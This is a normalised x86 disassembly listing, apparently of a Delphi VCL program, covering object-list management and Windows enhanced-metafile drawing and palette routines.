mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_411c4c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_411c4c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x14 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_411c4c
push 0x0
mov eax [ r-xdata ]
push eax
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_44e378
mov ecx [ ebp - 0x18 ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
call sub_411c4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411b93
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_44cb04
retn
add esp 0xfffffff0
call sub_44c370
sub_411c4c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_411ce1
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax 0x10
call sub_44d644
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x8 ]
call sub_446284
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x14 ]
add eax 0x4
call sub_44cb34
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x14 ]
mov [ edx ] eax
mov eax [ ebp - 0x14 ]
add eax 0x8
mov edx [ ebp - 0xc ]
call sub_44cb34
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
mov [ edx + 0xc ] eax
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43c264
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411ce8
lea eax [ ebp - 0x18 ]
call sub_44cae0
retn
sub_411cf0
push ebp
mov ebp esp
add esp 0xfffffeec
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_411d7e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x10 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_411d85
lea eax [ ebp - 0x14 ]
call sub_44cae0
retn
dec [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov eax [ eax ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x114 ]
mov eax [ ebp - 0xc ]
call sub_44bfbc
lea edx [ ebp - 0x114 ]
lea eax [ ebp - 0x14 ]
call sub_44cd04
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_44ce70
je r-xdata
sub_411d8c
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] eax
dec [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov edx [ r-xdata ]
mov eax [ ebp - 0x10 ]
call sub_44d658
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c2dc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_43c464
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
call sub_44c27c
test al al
je r-xdata
sub_411df0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ esi ] bl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
enter 0x44a5 0x0
xchg esp eax
retn 0x44
sub_411e4c
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov ecx [ r-xdata ]
mov dx 0x3
mov eax [ ebp - 0x4 ]
call sub_411f1c
mov ecx [ r-xdata ]
mov dx 0xe
mov eax [ ebp - 0x4 ]
call sub_411f1c
mov ecx [ r-xdata ]
mov dx 0x2
mov eax [ ebp - 0x4 ]
call sub_411f1c
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_411ee0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_44c070
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_411f1c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x6 ] dx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
call sub_43c264
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_411f67
push [ fs : eax ]
mov [ fs : eax ] esp
movzx edx [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_43c264
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_411f8c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] eax
dec [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43c2dc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_43c2dc
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43c464
mov edx [ ebp - 0x8 ]
call sub_44c27c
test al al
je r-xdata
sub_411ff0
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_411aa8
mov [ rw-data ] eax
sub_41201c
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_411e4c
mov [ rw-data ] eax
sub_412048
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
call sub_411ff0
call sub_41201c
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_412094
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43ccd0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_4120d0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_44bfb8
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44c1e8
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43ce10
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
sub_412114
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_4121ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
call sub_44bfb8
mov dl 0x1
call [ eax + 0xc ]
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
push eax
mov eax edx
mov dx 0xfffd
call sub_44c264
mov edx eax
pop eax
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x14 ] edx
push eax
mov eax edx
mov dx 0xfffc
call sub_44c264
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4121d8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_412114
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_412114
jmp r-xdata
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cd0c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412114
jmp r-xdata
sub_412248
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
push 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_411ff0
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_411c4c
mov esp ebp
pop ebp
retn 0x4
sub_412274
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_411d8c
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_411f8c
sub_4122b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xa ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_4122ec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov al [ ebp + 0x14 ]
push eax
mov al [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ebx [ ebp - 0x4 ]
mov cl [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_41232c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x54 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41244e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x50 ]
mov ecx 0x1
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
xor ecx ecx
mov cl [ ebp - 0x50 ]
lea edx [ ebp - 0x4f ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
lea eax [ ebp - 0x54 ]
lea edx [ ebp - 0x50 ]
call sub_44cd04
mov edx [ ebp - 0x54 ]
mov eax [ rw-data ]
call sub_411cf0
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x10 ]
call [ eax + 0xc ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4123c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412455
lea eax [ ebp - 0x54 ]
call sub_44cae0
retn
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
push eax
mov eax edx
mov dx 0xfffd
call sub_44c264
mov edx eax
pop eax
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x14 ] edx
push eax
mov eax edx
mov dx 0xfffc
call sub_44c264
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
sub_4123c7
mov eax [ ebp - 0xc ]
call sub_44c070
call sub_44c7c4
call sub_44c818
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_44c070
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov bx 0xfffd
call sub_44c24c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412455
lea eax [ ebp - 0x54 ]
call sub_44cae0
retn
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
push eax
mov eax edx
mov dx 0xfffd
call sub_44c264
mov edx eax
pop eax
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x14 ] edx
push eax
mov eax edx
mov dx 0xfffc
call sub_44c264
mov edx eax
pop eax
mov [ eax + 0x10 ] edx
sub_41245c
push ebp
mov ebp esp
add esp 0xfffffeb8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x48 ] 0x0
lea edx [ ebp - 0x148 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov eax [ eax ]
call sub_44bfbc
lea edx [ ebp - 0x148 ]
lea eax [ ebp - 0x48 ]
mov cl 0x3f
call sub_44bc6c
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor ecx ecx
mov cl [ ebp - 0x48 ]
inc ecx
lea edx [ ebp - 0x48 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
sub_4124cc
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x4 ] 0x0
setne [ ebp - 0x1 ]
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
mov al [ ebp - 0x1 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
cmp eax [ edx + 0x4 ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
sub_412564
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
push sub_41232c
mov eax [ ebp - 0x8 ]
push eax
push sub_41245c
push ebp
call sub_4124cc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4125b0
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov [ ebp - 0x8 ] eax
sub_4125dc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov [ ebp - 0x8 ] eax
sub_412608
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_40db50
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
call DeleteEnhMetaFile
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_412668
push ebp
mov ebp esp
add esp 0xfffffff8
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4115f4
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp - 0x4 ]
mov [ eax + 0x19 ] 0x1
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
pop ecx
pop ecx
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4126c4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a10
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_43ccd0
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_412700
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_44c1e8
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a10
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43cd0c
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x8 ]
mov al [ eax + 0x24 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24 ] al
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
call sub_413a00
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
cmp eax [ ebp - 0xc ]
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1a ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
mov al 0x1
mov esp ebp
pop ebp
retn
sub_4127d4
push ebp
mov ebp esp
add esp 0xffffffdc
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov esi eax
lea edi [ ebp - 0x24 ]
mov ecx 0x4
[ edi ] [ esi ]
dec [ ebp - 0x1c ]
dec [ ebp - 0x18 ]
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40fc38
push eax
call PlayEnhMetaFile
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push 0xffffffff
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40fc38
push eax
call SelectPalette
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x8 ]
call sub_40fc38
push eax
call RealizePalette
push 0xffffffff
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40fc38
push eax
call SelectPalette
sub_41289c
push ebp
mov ebp esp
add esp 0xffffff90
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_412af4
push 0x9ec
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x70 ]
push eax
push 0x64
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFileHeader
imul eax [ ebp - 0x1c ] 0x64
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x10 ]
push eax
call MulDiv
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_41292c
push ebp
mov ebp esp
add esp 0xfffffbf0
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x8 ]
push eax
call GetEnhMetaFilePaletteEntries
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x100
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x14 ]
call sub_40db50
mov [ ebp - 0x410 ] 0x300
mov ax [ ebp - 0xc ]
mov [ ebp - 0x40e ] ax
lea eax [ ebp - 0x40c ]
